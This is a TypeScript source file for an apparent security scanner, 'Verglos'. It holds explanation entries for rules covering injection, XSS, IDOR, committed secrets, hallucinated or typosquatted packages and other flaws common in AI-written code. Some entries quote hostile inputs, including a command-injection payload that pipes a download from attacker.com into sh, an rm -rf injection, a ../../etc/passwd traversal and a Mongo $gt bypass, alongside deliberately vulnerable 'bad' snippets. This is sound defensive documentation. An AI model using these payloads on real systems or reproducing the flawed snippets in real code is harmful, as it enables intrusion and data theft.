/**
 * Static explain-bank — one entry per rule ID Verglos emits.
 *
 * Consumed by:
 *   - `verglos explain <rule>` (follow-up)
 *   - MCP tool `verglos_explain_finding` (follow-up)
 *
 * Fields intentionally denormalize the detector's `why` and `fix`
 * so the command works without needing a finding in hand: users
 * paste a rule id from a report or a badge and get context.
 */

import type { ConfidenceLevel, Domain, Severity } from "@verglos/shared";

export interface ExplainEntry {
  rule: string;
  title: string;
  domain: Domain;
  severity: Severity;
  confidence: ConfidenceLevel;
  why: string;
  fix: string;
  refs: string[];
  example?: {
    bad: string;
    good: string;
  };
}

export const EXPLAIN_BANK: Record<string, ExplainEntry> = {
  // ─── D1 · Input validation & injection ──────────────────────────────────
  "D1-001": {
    rule: "D1-001",
    title: "SQL injection (string interpolation)",
    domain: "D1",
    severity: "critical",
    confidence: "high",
    why: "String-interpolated queries let user input become part of the SQL grammar. The driver has no way to tell where the query ends and the data begins.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
    refs: ["CWE-89", "OWASP: A03 Injection"],
    example: {
      bad: 'db.query(`SELECT * FROM users WHERE email = \'${email}\'`)',
      good: 'db.query("SELECT * FROM users WHERE email = $1", [email])',
    },
  },
  "D1-002": {
    rule: "D1-002",
    title: "SQL injection (concatenation)",
    domain: "D1",
    severity: "critical",
    confidence: "high",
    why: "Concatenating user input into SQL is identical to string interpolation — attacker-controlled data ends up in the query grammar.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
    refs: ["CWE-89"],
  },
  "D1-003": {
    rule: "D1-003",
    title: "Command injection",
    domain: "D1",
    severity: "critical",
    confidence: "high",
    why: "Shelling out with user input hands the attacker your process's shell. A single `; rm -rf` or `$(curl attacker.com/x | sh)` is often enough.",
    fix: "Avoid shell execution with user input. Use allowlists and sanitize inputs. Prefer library APIs over spawn/exec when possible.",
    refs: ["CWE-78", "OWASP: A03 Injection"],
  },
  "D1-004": {
    rule: "D1-004",
    title: "XSS via dangerouslySetInnerHTML with dynamic content",
    domain: "D1",
    severity: "high",
    confidence: "high",
    why: "React's dangerouslySetInnerHTML bypasses its normal escaping. Any user-controlled string that reaches it can inject scripts into your users' sessions.",
    fix: "Sanitize HTML with DOMPurify before rendering, or use plain text via {children}.",
    refs: ["CWE-79"],
  },
  "D1-005": {
    rule: "D1-005",
    title: "NoSQL injection ($gt bypass)",
    domain: "D1",
    severity: "critical",
    confidence: "high",
    why: "The `{$gt: \"\"}` shape bypasses Mongo authentication when user JSON is passed straight into a query — every stored user matches.",
    fix: "Validate and sanitize all user input before database queries. Strip Mongo operator keys ($gt, $ne, etc.) from user payloads.",
    refs: ["CWE-943"],
  },
  "D1-006": {
    rule: "D1-006",
    title: "Path traversal",
    domain: "D1",
    severity: "high",
    confidence: "high",
    why: "A path like `../../etc/passwd` walks out of the intended directory. If any user input reaches a file read without allowlist checking, arbitrary file disclosure follows.",
    fix: "Validate paths against an allowlist. Use path.resolve and check the prefix stays inside the intended root.",
    refs: ["CWE-22"],
  },
  "D1-007": {
    rule: "D1-007",
    title: "XSS via innerHTML",
    domain: "D1",
    severity: "high",
    confidence: "high",
    why: "innerHTML parses its input as HTML — scripts, event handlers, iframes. If any user-controlled string reaches it unsanitized, XSS follows.",
    fix: "Use textContent for plain text, or sanitize trusted HTML with DOMPurify.",
    refs: ["CWE-79"],
  },

  // ─── D3 · Authorization & access control ────────────────────────────────
  "D3-001": {
    rule: "D3-001",
    title: "Mass assignment via direct req.body",
    domain: "D3",
    severity: "high",
    confidence: "high",
    why: "Passing req.body directly to model creation allows mass assignment. A user can set fields you never intended to expose (e.g. isAdmin).",
    fix: "Explicitly pick allowed fields instead of spreading req.body.",
    refs: ["CWE-915"],
  },

  // ─── D4 · Cryptography ──────────────────────────────────────────────────
  "D4-001": {
    rule: "D4-001",
    title: "Committed secret / API key in source",
    domain: "D4",
    severity: "critical",
    confidence: "certain",
    why: "A committed credential lets anyone with repo access (or a leak of build artifacts, logs, CI env, or a stolen laptop) act as your service.",
    fix: "Move the value to a .env file, ensure .env is in .gitignore, and rotate the compromised credential immediately.",
    refs: ["CWE-798"],
  },
  "D4-002": {
    rule: "D4-002",
    title: "High-entropy string (possible secret)",
    domain: "D4",
    severity: "high",
    confidence: "medium",
    why: "Long, high-entropy random-looking strings adjacent to credential-shaped identifiers are frequently secrets that dodged the named-pattern list.",
    fix: "Verify this is not a secret. If it is, move to environment variables and rotate.",
    refs: ["CWE-798"],
  },
  "D4-003": {
    rule: "D4-003",
    title: "Math.random() near security-sensitive context",
    domain: "D4",
    severity: "high",
    confidence: "high",
    why: "Math.random() is a predictable PRNG seeded from clock/context. An attacker who sees a few outputs can predict the next one.",
    fix: "Use crypto.randomBytes() or crypto.getRandomValues() for anything security-sensitive.",
    refs: ["CWE-338", "CWE-330"],
  },

  // ─── D5 · Security misconfiguration ─────────────────────────────────────
  "D5-001": {
    rule: "D5-001",
    title: ".env file may be committed to git",
    domain: "D5",
    severity: "critical",
    confidence: "high",
    why: "A committed .env leaks every credential in it. Deleting the file later doesn't undo the exposure — the values are in git history.",
    fix: 'Add ".env" and ".env*" to .gitignore. Never commit secrets.',
    refs: ["CWE-538"],
  },
  "D5-002": {
    rule: "D5-002",
    title: "Wildcard CORS configuration",
    domain: "D5",
    severity: "high",
    confidence: "certain",
    why: "Wildcard CORS lets any web page in a browser call your API. Combined with any missing CSRF check, it's game over.",
    fix: "Restrict CORS to an explicit allowlist of trusted origins.",
    refs: ["CWE-942"],
  },
  "D5-003": {
    rule: "D5-003",
    title: "Use of eval()",
    domain: "D5",
    severity: "high",
    confidence: "certain",
    why: "eval() turns any user-controlled string into executable code. If any input reaches it, remote code execution is one line away.",
    fix: "Remove eval() and use safer alternatives (JSON.parse for JSON, real parsers for expressions).",
    refs: ["CWE-95"],
  },
  "D5-004": {
    rule: "D5-004",
    title: "Missing security headers",
    domain: "D5",
    severity: "medium",
    confidence: "high",
    why: "Modern browsers only enforce security policy when the response says so. Without CSP + HSTS + X-Frame-Options, XSS and clickjacking work by default.",
    fix: "Run `verglos fix --headers` to add framework-aware defaults, or configure them manually in next.config / helmet / your equivalent.",
    refs: ["CWE-693"],
  },

  // ─── D6 · Dependency & supply chain ─────────────────────────────────────
  "D6-001": {
    rule: "D6-001",
    title: "Vulnerable dependency (OSV)",
    domain: "D6",
    severity: "high",
    confidence: "certain",
    why: "A known-vulnerable dependency is a public roadmap for an attacker — the CVE describes the payload. Upgrades usually take minutes.",
    fix: "Upgrade to the fixed version listed in the finding. If the dependency is transitive, force-resolve or upgrade the parent.",
    refs: ["OSV.dev"],
  },

  // ─── D8 · Data exposure & privacy ───────────────────────────────────────
  "D8-001": {
    rule: "D8-001",
    title: "Sensitive data logged to console",
    domain: "D8",
    severity: "medium",
    confidence: "high",
    why: "Log aggregators ingest console output. A password or token logged once ends up in log storage for the retention window (30-90 days).",
    fix: "Remove logging of sensitive fields or redact them.",
    refs: ["CWE-532"],
  },
  "D8-002": {
    rule: "D8-002",
    title: "Secret in git history",
    domain: "D8",
    severity: "critical",
    confidence: "certain",
    why: "64% of credentials confirmed leaked in 2022 were still active in 2026. Deleting a file doesn't unleak the key — it lives in every clone forever. Rotation is the only fix.",
    fix: "Rotate the credential immediately. Use git filter-repo or BFG to purge the value from history (secondary — rotation is what matters).",
    refs: ["CWE-798", "CWE-540"],
  },

  // ─── D9 · Infrastructure & runtime ──────────────────────────────────────
  "D9-002": {
    rule: "D9-002",
    title: "SSRF via user-controlled fetch",
    domain: "D9",
    severity: "high",
    confidence: "high",
    why: "A server-side fetch on a user URL can hit the cloud metadata endpoint (169.254.169.254) and leak IAM credentials, or reach internal services no external attacker could touch.",
    fix: "Validate URLs against an allowlist. Block internal IP ranges (RFC 1918, link-local, loopback).",
    refs: ["CWE-918"],
  },

  // ─── AI-* · Rules specific to AI-generated code ─────────────────────────
  "AI-001": {
    rule: "AI-001",
    title: "Wildcard CORS on an app with authentication",
    domain: "D5",
    severity: "critical",
    confidence: "high",
    why: "Every CORS tutorial writes '*' because it's the shortest snippet that makes an example work. On an app with logged-in users this is catastrophic — combined with cookie or Authorization-header handling, it enables full session hijack from any origin.",
    fix: "Restrict origin to an explicit allowlist. Never combine `Access-Control-Allow-Origin: *` with credentials.",
    refs: ["CWE-942", "CWE-346"],
    example: {
      bad: "res.setHeader('Access-Control-Allow-Origin', '*')",
      good: "const allowed = ['https://app.example.com']; if (allowed.includes(origin)) res.setHeader('Access-Control-Allow-Origin', origin)",
    },
  },
  "AI-002": {
    rule: "AI-002",
    title: "Math.random / Date.now feeding a token / OTP / session sink",
    domain: "D4",
    severity: "critical",
    confidence: "certain",
    why: "Math.random() and Date.now() are deterministic pseudo-random generators. An attacker who observes a few outputs — or knows roughly when a value was generated — can predict the next one. Every OTP/token tutorial uses one of these because they 'just work' at demo time.",
    fix: "Use crypto.randomBytes() / crypto.randomInt() (Node) or crypto.getRandomValues() (browser).",
    refs: ["CWE-338", "CWE-330"],
    example: {
      bad: "const otp = Math.floor(100000 + Math.random() * 900000)",
      good: "const otp = crypto.randomInt(100000, 1000000)",
    },
  },
  "AI-003": {
    rule: "AI-003",
    title: "IDOR — record looked up by user id without ownership check",
    domain: "D3",
    severity: "high",
    confidence: "high",
    why: "Models can infer 'who are you' (auth is well-documented in tutorials) but not 'may you' (authorization depends on the app's data model, which isn't in the prompt). The result is the classic IDOR: /api/invoice/1234 → /api/invoice/1235 returns someone else's record.",
    fix: "Add an ownership predicate: `where: { id, userId: req.user.id }`. Never trust that authentication alone implies authorization.",
    refs: ["CWE-639", "OWASP: A01 Broken Access Control"],
    example: {
      bad: "const invoice = await db.invoice.findFirst({ where: { id: req.params.id } })",
      good: "const invoice = await db.invoice.findFirst({ where: { id: req.params.id, userId: req.user.id } })",
    },
  },
  "AI-004": {
    rule: "AI-004",
    title: "Mass assignment via spread",
    domain: "D3",
    severity: "high",
    confidence: "high",
    why: "Spreading req.body into a model constructor lets a user set fields you never intended to expose — isAdmin, stripe_customer_id, email_verified. Concise, idiomatic, in every quickstart.",
    fix: "Explicitly pick allowed fields, or parse into a typed subset with zod / valibot before persisting.",
    refs: ["CWE-915"],
    example: {
      bad: "await User.create({ ...req.body })",
      good: "const parsed = z.object({ name: z.string(), email: z.string().email() }).parse(req.body); await User.create(parsed)",
    },
  },
  "AI-005": {
    rule: "AI-005",
    title: "Package does not exist on npm (hallucinated)",
    domain: "D6",
    severity: "critical",
    confidence: "certain",
    why: "~20% of package names LLMs recommend don't exist. Either the install silently failed (missing dependency in production) or — much worse — a squatter registered the hallucinated name in the meantime and is now shipping malware.",
    fix: "Remove the package from package.json and any imports. Verify what you actually meant to install.",
    refs: [],
  },
  "AI-006": {
    rule: "AI-006",
    title: "Typosquat — one keystroke off a top-N package",
    domain: "D6",
    severity: "high",
    confidence: "medium",
    why: "Models mis-remember popular package names in predictable ways. Squatters register the mis-remembered spellings and wait for an LLM to suggest one. The package exists on npm, but the name is one or two letters off a top-N.",
    fix: "Verify the package name is really what you meant. If not, remove and install the popular alternative shown in the finding.",
    refs: [],
  },
  "AI-007": {
    rule: "AI-007",
    title: "Test-mode key committed as a real value",
    domain: "D4",
    severity: "high",
    confidence: "medium",
    why: "Test-mode keys aren't harmless. Stripe test keys let anyone with the key see test customers, charge test cards, and pivot to production account reconnaissance. And what the AI copy-pasted from a docs page became a real committed key.",
    fix: "Move to a .env file, rotate the key in the Stripe dashboard, and add `.env*` to .gitignore.",
    refs: ["CWE-798"],
  },
  "AI-008": {
    rule: "AI-008",
    title: "Stack trace / error message leaked in HTTP response",
    domain: "D8",
    severity: "high",
    confidence: "high",
    why: "res.send(err.stack) is the debuggable version of a catch handler. In production it hands attackers your directory layout, dependency versions, database schema, and often the actual query that failed. Models optimize for the demo working.",
    fix: "Log the error server-side (pino/winston/sentry). Return a generic message: res.status(500).json({ error: 'Internal server error' }).",
    refs: ["CWE-209", "CWE-497"],
    example: {
      bad: "app.use((err, req, res, next) => { res.status(500).json({ error: err.stack }) })",
      good: "app.use((err, req, res, next) => { logger.error(err); res.status(500).json({ error: 'Internal server error' }) })",
    },
  },
  "AI-009": {
    rule: "AI-009",
    title: "Permissive generated config default",
    domain: "D5",
    severity: "medium",
    confidence: "medium",
    why: "Model defaults pick 'the setting that doesn't throw an error' over 'the setting that's safe.' Every one of these disables a check the browser or the runtime would otherwise enforce.",
    fix: "Flip the flag to the secure default. If you need the permissive value for local dev, gate it on `NODE_ENV !== 'production'`.",
    refs: ["CWE-732"],
  },
  "AI-010": {
    rule: "AI-010",
    title: "Mutation on an authenticated route with no authorization check",
    domain: "D3",
    severity: "medium",
    confidence: "medium",
    why: "Models implement 'who are you' well (auth is in every tutorial) and skip 'may you' (authz is app-specific). The result is an endpoint that only requires being logged in to delete another user's data.",
    fix: "Before the mutation, verify the caller has the right to perform it: check a role, an ownership predicate, or a policy helper.",
    refs: ["CWE-285", "CWE-862", "OWASP: A01 Broken Access Control"],
  },
};

/** Canonical rule ids in a stable order — used by `verglos explain --list`. */
export function listRules(): string[] {
  return Object.keys(EXPLAIN_BANK).sort();
}

/** Case-insensitive lookup. Returns undefined for unknown ids. */
export function lookupRule(rule: string): ExplainEntry | undefined {
  const upper = rule.toUpperCase();
  return EXPLAIN_BANK[upper];
}
